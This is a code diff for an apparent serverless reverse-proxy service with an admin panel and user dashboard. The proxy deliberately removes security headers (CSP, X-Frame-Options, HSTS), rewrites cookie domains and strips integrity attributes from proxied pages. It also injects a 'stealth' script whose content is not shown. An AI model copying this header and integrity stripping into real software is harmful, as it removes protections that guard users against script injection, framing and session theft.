+                                    <input value="\${n.image||''}" oninput="uNotif('image',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none focus:border-indigo-500">
+                                    <div class="flex gap-3">
+                                        <div class="w-1/2">
+                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Text</label>
+                                            <input value="\${n.btnText||''}" oninput="uNotif('btnText',this.value)" placeholder="JOIN NOW" class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500">
+                                        </div>
+                                        <div class="w-1/2">
+                                            <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Link</label>
+                                            <input value="\${n.btnLink||''}" oninput="uNotif('btnLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500">
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>\`;
+                        }
+                        document.getElementById('app').innerHTML = html;
+                    }
+                    load();
+                </script>
+            </body>
+            </html>`;
+            return new Response(adminHTML, { headers: { "Content-Type": "text/html" } });
+        }
+
         // --- 💻 USER DASHBOARD & PROXY INIT ---
         if (path === "/dashboard") {
             if (!isUser) return Response.redirect(url.origin, 302);
@@ -502,7 +751,7 @@ export default {
 
                     const connectBtn = isSuspended 
                         ? `<button disabled class="w-full py-4 bg-white/5 text-gray-500 text-[10px] font-bold uppercase tracking-[0.2em] cursor-not-allowed border border-white/5 mt-4">Suspended</button>`
-                        : `<button onclick="${loginAction}" class="w-full py-4 bg-indigo-600 text-white text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-indigo-500 transition-colors flex items-center justify-center gap-2 mt-4 shadow-[0_0_20px_rgba(99,102,241,0.3)] outline-none"><span>Secure Connect</span><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75"></path></svg></button>`;
+                        : `<button onclick="${loginAction}" class="w-full py-4 bg-indigo-600 text-white text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-indigo-500 transition-colors flex items-center justify-center gap-2 mt-4 shadow-[0_0_20px_rgba(99,102,241,0.3)] outline-none whitespace-nowrap"><span>Login Agent Panel</span><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.75 9V5.25A2.25 2.25 0 0013.5 3h-6a2.25 2.25 0 00-2.25 2.25v13.5A2.25 2.25 0 007.5 21h6a2.25 2.25 0 002.25-2.25V15M12 9l-3 3m0 0l3 3m-3-3h12.75"></path></svg></button>`;
 
                     sitesHTML += `
                     <div class="border border-white/5 bg-[#0a0a0a] p-5 flex flex-col justify-between ${isSuspended ? 'opacity-60 grayscale' : ''}">
@@ -551,7 +800,7 @@ export default {
                                 </div>
                                 <div id="pwd-edit-${siteId}" class="hidden mt-2 flex gap-2 pt-2 border-t border-white/10">
                                     <input type="text" id="pwd-in-${siteId}" autocomplete="new-password" placeholder="Type new password..." class="flex-grow bg-black/50 border border-white/10 p-2 text-xs text-white outline-none focus:border-yellow-500 transition-colors">
-                                    <button onclick="savePwd('${siteId}')" class="px-4 bg-yellow-500/20 text-yellow-400 border border-yellow-500/50 hover:bg-yellow-500 hover:text-black transition-all text-[9px] font-bold uppercase tracking-widest">Save</button>
+                                    <button onclick="savePwd('${siteId}')" class="px-4 bg-yellow-500/20 text-yellow-400 border border-yellow-500/50 hover:bg-yellow-50 hover:text-black transition-all text-[9px] font-bold uppercase tracking-widest">Save</button>
                                 </div>
 
                                 <div class="bg-white/5 border border-white/10 flex items-center p-1.5 w-full mt-2">
@@ -744,7 +993,7 @@ export default {
             
             const removeHeaders =['content-security-policy', 'content-security-policy-report-only', 'x-frame-options', 'strict-transport-security'];
             
-            for (const [key, value] of proxyRes.headers.entries()) {
+            for (const[key, value] of proxyRes.headers.entries()) {
                 const kLower = key.toLowerCase();
                 if (kLower === 'set-cookie') {
                     let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
@@ -772,6 +1021,9 @@ export default {
                     textBody = textBody.split(tHost).join(pHost);
                     
                     if (contentType.includes("text/html")) {
+                        // 🚀 STRIP INTEGRITY TAGS SO CSS/JS FROM CDNs LOAD PROPERLY
+                        textBody = textBody.replace(/integrity=(['"]).*?\1/gi, '');
+
                         const encTargetTrim = encrypt(targetDomain).substring(0,8);
                         
                         const stealthScript = `<script>
@@ -1038,7 +1290,9 @@ export default {
                     }
                     
                     body = textBody;
+                    // 🚀 CRITICAL FIX: Delete Content-Encoding so CSS/JS load properly after parsing!
                     responseHeaders.delete("Content-Length"); 
+                    responseHeaders.delete("Content-Encoding"); 
                 } catch(err) {
                     // Fallback to original body stream if parsing fails
                 }
